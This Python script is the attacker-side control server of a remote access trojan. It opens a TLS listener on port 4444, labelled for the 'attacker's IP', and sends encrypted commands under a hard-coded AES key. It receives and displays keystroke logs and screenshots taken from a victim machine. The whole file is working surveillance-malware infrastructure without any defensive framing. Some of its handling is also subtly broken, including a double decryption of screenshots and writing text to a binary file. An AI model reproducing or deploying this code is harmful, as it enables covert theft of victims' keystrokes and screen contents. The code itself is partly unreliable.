import socket
import ssl
import subprocess
import os
import time
from Crypto.Cipher import AES
import base64
from PIL import Image

# Hardcode the AES key
KEY = b'mysecretkey123456789012345678901'

def encrypt(message):
    cipher = AES.new(KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(message.encode('utf-8'))
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode('utf-8')

def decrypt(ciphertext):
    data = base64.b64decode(ciphertext.encode('utf-8'))
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(KEY, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')

# Create a socket connection
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Create an SSL context
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='C:/Users/Bobby/certificate.pem', keyfile='C:/Users/Bobby/private_key.pem')

# Wrap the socket with the SSL context
ssl_server = context.wrap_socket(server, server_side=True)

# Bind the server to a specific IP and Port
SERVER_IP = '127.0.0.1'  # Change to attacker's IP
SERVER_PORT = 4444
ssl_server.bind((SERVER_IP, SERVER_PORT))

# Listen for incoming connections
ssl_server.listen(1)
print(f"Listening on {SERVER_IP}:{SERVER_PORT}")

while True:
    try:
        # Accept incoming connection
        client, address = ssl_server.accept()
        print(f"Connected by {address}")

        keylog_data = ""

        while True:
            # Send command to the client
            command = input("Enter command: ")
            client.send(encrypt(command).encode('utf-8'))

            # Receive response from the client
            while True:
                response = client.recv(4096).decode('utf-8')
                if not response:
                    break
                response = decrypt(response)

                if response.startswith('keylog'):
                    keylog_data += response[6:] + " "
                elif response.startswith('screenshot'):
                    # Decrypt the screenshot data
                    decrypted_data = decrypt(response[10:])

                    # Save the decrypted screenshot data to a file
                    with open('screenshot.png', 'wb') as f:
                        f.write(decrypted_data)

                    # Display the screenshot
                    image = Image.open('screenshot.png')
                    image.show()
                else:
                    print(response)

            if keylog_data:
                print(f"Keylog: {keylog_data}")
                keylog_data = ""

    except (ConnectionResetError, BrokenPipeError):
        print("Connection lost. Waiting for reconnect...")
    except Exception as e:
        print(f"Error: {e}")